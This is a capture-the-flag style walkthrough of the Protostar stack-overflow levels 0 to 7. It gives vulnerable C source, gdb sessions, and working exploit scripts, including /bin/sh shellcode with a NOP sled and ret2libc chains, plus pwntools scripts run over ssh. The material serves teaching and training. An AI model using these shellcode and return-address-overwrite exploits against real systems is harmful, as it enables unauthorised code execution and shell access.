## Stack 0

Here's the source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}

```

I'm going to open it on gdb

```bash
$ gdb stack0
(gdb) set disassembly-flavor intel
(gdb) disass main
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave  
0x08048434 <main+64>:   ret    
End of assembler dump.
```

I'm going to create a cyclic pattern using pwntools
```python
$ python3
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

So now i only have to send it
```bash
(gdb) r
Starting program: /opt/protostar/bin/stack0 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
you have changed the 'modified' variable

Program received signal SIGSEGV, Segmentation fault.
0x61616175 in ?? ()
```

For solving this you don't need to open it on gdb.


You can script this with pwntools to connect it over ssh and send the payload.
It would look like this:

```python
from pwn import *
import paramiko

user = 'user'
password = user
host = '<ip>'

s = ssh(user=user,password=password,host=host)

payload = b'a'*100
p = s.run(['/opt/protostar/bin/stack0'])
p.sendline(payload)
p.interactive()
```

<br/>

## Stack 1

Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
\
So i have to overflow variable and write 0x61626364
To writte the address it has to be in little endian, you can do it manually or use pwntools and p32(0x61626364)
```bash
./stack1 $(python -c "print 'A'*64+'\x64\x63\x62\x61')
```
\
Now I scripted it:
```python
from pwn import *
import paramiko

user = 'user'
password = user
host = '<ip>'

s = ssh(user=user,password=password,host=host)

#payload = b'a'*64 + p32(0x61626364)
p = s.run('sh')
p.sendline('/opt/protostar/bin/stack1' + ' ' + 'a'*64 + '\x64\x63\x62\x61')
p.interactive()
```

<br/>

## Stack 2

Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

<br/>

So now let's set the enviorment variable GREENIE to 0x0d0a0d0a
```bash
$ export GREENIE=$(python -c "print 'A'*64+'\x0a\x0d\x0a\x0d'")
$ ./stack2
   you have correctly modified the variable
```

<br/>

Now let's script this
```python
from pwn import *
import paramiko

user = 'user'
password = user
host = '<ip>'

s = ssh(user=user,password=password,host=host)

p = s.run('sh', env= {'GREENIE' : 'a'*64 + '\x0a\x0d\x0a\x0d'})

p.sendline('/opt/protostar/bin/stack2')
p.interactive()
```

<br/>

## Stack 3

Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

<br/>

Getting the address of the win function
```bash
$ objdump -x stack3 | grep win
  08048424 g     F .text  00000014              win
```

<br/>

Causing a overflow and then jumping to the win function.
```bash
$ (python -c "print 'A'*64 + '\x24\x84\x04\x08'";) | ./stack3
  calling function pointer, jumping to 0x08048424
  code flow successfully changed
```

<br/>

Now let's script this
```python
from pwn import *
import paramiko

user = 'user'
password = user
host = '<ip>'

s = ssh(user=user,password=password,host=host)
p = s.run('/opt/protostar/bin/stack3')

#objdump -x stack3 | grep win
payload = b'a'*64 + p32(0x08048424)
p.sendline(payload)
p.interactive()
```

<br/>

## Stack 4

Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

<br/>

Generating a cyclic pattern with pwntools
```python
python3
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

<br/>

Now let's open it on GDB

```bash
$gdb stack4
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave  
0x0804841e <main+22>:   ret    
End of assembler dump.
```
Now send the pattern to cause a segmentation fault and get the address
```bash
(gdb) r
Starting program: /opt/protostar/bin/stack4 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()
```
Finding the offset
```python
>>> cyclic_find(0x61616174)
76
```

<br/>

Getting the address of the win function
```
$ objdump -x stack4 | grep win
  080483f4 g     F .text  00000014              win
```

<br/>

Now let's send it all
```bash
$ (python -c "print 'a'*76 + '\xf4\x83\x04\x08'";)| ./stack4
  code flow successfully changed
```

<br/>

Now let's script this
```python
from pwn import *
import paramiko

user = 'user'
password = user
host = '<ip>'

s = ssh(user=user,password=password,host=host)

payload = b'a'*76 + p32(0x080483f4)
p = s.run('/opt/protostar/bin/stack4')
p.sendline(payload)
p.interactive()
```

<br/>

## Stack 5

Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

<br/>

Now let's open it on GDB
```bash
$ gdb stack5
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x50
0x080483cd <main+9>:    lea    eax,[esp+0x10]
0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave  
0x080483da <main+22>:   ret    
End of assembler dump.
```
Now i'll set a breakpoint before the programs finish.
```bash
(gdb) break *0x080483da
```

<br/>

Now I have to find the offset i'll show two ways

<br/>

The first one
```bash
(gdb) r
Starting program: /opt/protostar/bin/stack5 
abcdef

Breakpoint 1, 0x080483da in main (argc=134513604, argv=0x1) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) info reg
eax            0xbffff700       -1073744128
ecx            0xbffff700       -1073744128
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff74c       0xbffff74c
ebp            0xbffff7c8       0xbffff7c8
esi            0x0      0
edi            0x0      0
eip            0x80483da        0x80483da <main+22>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/s 0xbffff700
0xbffff700:      "abcdef"
(gdb) p/d 0xbffff74c - 0xbffff700
$1 = 76
```

And the other ways is using cyclic() and cyclic_find()

<br/>

Now I have to find the return address
```python
>>> print('A'*76+'B'*4+'C'*100)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```
I'll use this pattern because it's easy to see

<br/>

Now let's sending them and examine EAX to find the return address
```bash
(gdb) r
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

(gdb) x/60wx $eax
0xbffff700:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff710:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff720:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff730:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff740:     0x41414141      0x41414141      0x41414141      0x42424242
0xbffff750:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff760:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff770:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff780:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff790:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff7a0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffff7b0:     0x43434343      0xb7ff6200      0xb7eadb9b      0xb7ffeff4
0xbffff7c0:     0x00000001      0x08048310      0x00000000      0x08048331
0xbffff7d0:     0x080483c4      0x00000001      0xbffff7f4      0x080483f0
0xbffff7e0:     0x080483e0      0xb7ff1040      0xbffff7ec      0xb7fff8f8
```
So the retturn address is 0xbffff750

<br/>

Now let's write and exploit to get a shell
```python
import struct
padding = 'A' * 76
ret = struct.pack("I",0xbffff750+8)
nops = "\x90"*50
shellcode ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print padding + ret + nops + shellcode
```
I'll use struct to put the address in little endian, and the shellcode is from shellstorm, the nops are used because I don't know were the shellcode starts soI send a bunch of NOPs (No operation) so the code will go trough them until the shellcode.

<br/>

Now let's use it
```bash
$ (python /tmp/stack5.py;cat) | ./stack5
```

<br/>

And now the scripted way
```python
from pwn import *
import paramiko

user = 'user'
password = user
host = '<ip>'

s = ssh(user=user,password=password,host=host)
p = s.run('sh')
p.sendline('/opt/protostar/bin/stack5')

payload = b'a'*76
payload += p32(0xbffff7b0+16)
payload += b'\x90'*50
payload += b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

p.sendline(payload)
p.interactive()
```

<br/>

## Stack 6

Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```bash
(gdb) break *0x080483da
```

<br/>

Now let's open the program on GDB.
```bash
(gdb) break *0x080483da
```
Now generate a cyclic pattern
```python
python3
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```
Now send the pattern
```bash
(gdb) r
Starting program: /opt/protostar/bin/stack6 
input path please: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
got path aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaauaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616175 in ?? ()
```
Finding the offset
```python
>>> cyclic_find(0x61616175)
80
```

<br/>

Now I have to find the libc, system, exit, and binsh address
Finding the libc address:
```bash
(gdb) info proc map
process 1945
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fde000 0xb7fe2000     0x4000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
```
libc: 0xb7e97000 

<br/>

Finding the system address:
```bash
$ readelf -s /lib/libc-2.11.2.so | grep system
  1399: 00038fb0   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
```
system: 0x00038fb0

<br/>

Finding the exit address:
```bash
$ readelf -s /lib/libc-2.11.2.so | grep exit
  136: 0002f0c0    47 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
```
exit: 0x0002f0c0

<br/>

Finding the /bin/sh address:
```bash
$ strings -tx /lib/libc-2.11.2.so | grep "/bin/sh"
  11f3bf /bin/sh
```

<br/>

Now let's write an exploit with everything
```python
import struct

base = 0xb7e97000

padding = "A" * 80
system = struct.pack("I", base+0x00038fb0)
exit = struct.pack("I", base + 0x0002f0c0)
binsh = struct.pack("I", base + 0x11f3bf)

print padding + system + exit + binsh
```
And run it
```
$ (python /tmp/ex.py;cat)| /opt/protostar/bin/stack6
```

<br/>

As always the scripted version
```python
from pwn import *
import paramiko

user = 'user'
password = user
host = '<ip>'

s = ssh(user=user,password=password,host=host)

#base = 0xb7e97000
padding = b'a'*80
system = p32(0xb7e97000+0x00038fb0)
exit = p32(0xb7e97000+0x0002f0c0)
binsh = p32(0xb7e97000+0x11f3bf)
payload =  padding + system + exit +binsh

p = s.run('/opt/protostar/bin/stack6')
p.sendline(payload)
p.interactive()
```

<br/>

## Stack 7

Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

<br/>

Now let's open it on GDB
```bash
$ gdb stack7
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x08048545 <main+0>:    push   ebp
0x08048546 <main+1>:    mov    ebp,esp
0x08048548 <main+3>:    and    esp,0xfffffff0
0x0804854b <main+6>:    call   0x80484c4 <getpath>
0x08048550 <main+11>:   mov    esp,ebp
0x08048552 <main+13>:   pop    ebp
0x08048553 <main+14>:   ret    
End of assembler dump.
(gdb) disass getpath
Dump of assembler code for function getpath:                                                                                                                                           [0/354]
0x080484c4 <getpath+0>: push   ebp                                                             
0x080484c5 <getpath+1>: mov    ebp,esp                                                         
0x080484c7 <getpath+3>: sub    esp,0x68                                                        
0x080484ca <getpath+6>: mov    eax,0x8048620                                                   
0x080484cf <getpath+11>:        mov    DWORD PTR [esp],eax                                     
0x080484d2 <getpath+14>:        call   0x80483e4 <printf@plt>                                  
0x080484d7 <getpath+19>:        mov    eax,ds:0x8049780                                        
0x080484dc <getpath+24>:        mov    DWORD PTR [esp],eax                                     
0x080484df <getpath+27>:        call   0x80483d4 <fflush@plt> 
0x080484e4 <getpath+32>:        lea    eax,[ebp-0x4c]                                          
0x080484e7 <getpath+35>:        mov    DWORD PTR [esp],eax                                     
0x080484ea <getpath+38>:        call   0x80483a4 <gets@plt>                                    
0x080484ef <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]                                 
0x080484f2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax                                 
0x080484f5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]                                 
0x080484f8 <getpath+52>:        and    eax,0xb0000000                                          
0x080484fd <getpath+57>:        cmp    eax,0xb0000000                                          
0x08048502 <getpath+62>:        jne    0x8048524 <getpath+96>                                  
0x08048504 <getpath+64>:        mov    eax,0x8048634                                           
0x08048509 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x0804850c <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x08048510 <getpath+76>:        mov    DWORD PTR [esp],eax    
0x08048513 <getpath+79>:        call   0x80483e4 <printf@plt> 
0x08048518 <getpath+84>:        mov    DWORD PTR [esp],0x1                                     
0x0804851f <getpath+91>:        call   0x80483c4 <_exit@plt>                                   
0x08048524 <getpath+96>:        mov    eax,0x8048640                                           
---Type <return> to continue, or q <return> to quit---                                         
0x08048529 <getpath+101>:       lea    edx,[ebp-0x4c]         
0x0804852c <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x08048530 <getpath+108>:       mov    DWORD PTR [esp],eax   
0x08048533 <getpath+111>:       call   0x80483e4 <printf@plt>
0x08048538 <getpath+116>:       lea    eax,[ebp-0x4c]        
0x0804853b <getpath+119>:       mov    DWORD PTR [esp],eax   
0x0804853e <getpath+122>:       call   0x80483f4 <strdup@plt>
0x08048543 <getpath+127>:       leave  
0x08048544 <getpath+128>:       ret    
End of assembler dump.
```
The return address of getpath is: 0x08048544

<br/>

Let's find the offset

<br/>

Generating a cyclic pattern
```python
python3
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

Send the pattern

```bash
(gdb) r
Starting program: /opt/protostar/bin/stack7 
input path please: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
got path aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaauaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616175 in ?? ()
```

Find the offset

```python
>>> cyclic_find(0x61616175)
80
```

Now let's find the addresses needed to ret2libc:

```bash
$ readedelf -s /lib/libc-2.11.2.so | grep system
  1399: 00038fb0   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
```

system: 0x00038fb0

<br/>

```bash
$ readelf -s /lib/libc-2.11.2.so | grep exit
  136: 0002f0c0    47 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
```

exit: 0x0002f0c0

<br/>

```bash
$ strings -tx /lib/libc-2.11.2.so | grep "/bin/sh"
  11f3bf /bin/sh
```

binsh: 0x11f3bf

<br/>

Now let's make an exploit

```python
import struct
base = 0xb7e97000
offset = "a"*80
ret = struct.pack("I",0x08048544)
system = struct.pack("I",base+0x00038fb0)
exit = struct.pack("I",base+0x0002f0c0)
binsh= struct.pack("I", base + 0x11f3bf)

print offset + ret +system+exit + binsh
```

<br/>

Running the exploit

```bash
$ (python /tmp/ex.py;cat ) | ./stack7
```

<br/>

As always the scripted version

```python
from pwn import *
import paramiko

user = 'user'
password = user
host = '<ip>'

s = ssh(user=user,password=password,host=host)

#base = 0xb7e97000
padding = b'a'*80
ret = p32(0x08048544)
system = p32(0xb7e97000+0x00038fb0)
exit = p32(0xb7e97000+0x0002f0c0)
binsh = p32(0xb7e97000+0x11f3bf)

payload = padding + ret + system + exit + binsh

p = s.run('/opt/protostar/bin/stack7')
p.sendline(payload)
p.interactive()
```
